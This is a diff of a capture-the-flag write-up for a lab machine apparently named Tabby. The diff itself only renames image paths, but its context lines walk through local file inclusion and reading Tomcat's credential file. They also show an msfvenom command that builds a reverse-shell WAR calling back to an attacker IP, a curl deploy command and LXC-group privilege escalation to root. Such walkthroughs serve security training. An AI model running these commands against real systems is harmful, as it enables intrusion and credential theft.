@@ -4,23 +4,23 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### LFI
 
 We would have to add `megahosting.htb` to our `/etc/hosts` file to view port 80. Afterwards, we would just see something like this on the page:
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 When we press the Compare button, we would be brought to `/news.php?file=statement`. I tested for LFI, and it worked!
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Tomcat
 
 Tomcat was running on port 8080, and we would need to somehow get the manager password to upload a .war reverse shell. Since we have LFI, we can read it at `/usr/share/tomcat9/etc/tomcat-users.xml`.
 
-<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>
 
 The password is `$3cureP4s5w0rd123!`. Then, we can login to the admin dashboard, create a .war reverse shell using `msfvenom`, upload it, and execute it via `curl`:
 
@@ -29,7 +29,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f war -o rev
 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?path=/shell --upload-file rev.war
 ```
 
-<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -37,15 +37,15 @@ curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?
 
 When looking aroun the file system, I found this backup file here:
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (42) (2).png" alt=""><figcaption></figcaption></figure>
 
 This waws password protected, so let's transfer this back to our machine via `nc` and then use `john` on it:
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
 
 The backup file had nothing on it...which was weird. Since we have a password, might as well try `su`, and it worked to getting to `ash`:
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### LXC Group
 
@@ -59,6 +59,6 @@ This exploitable because we can create a container and mount it with root access
 
 Following the resource above, we can spawn a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (3).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
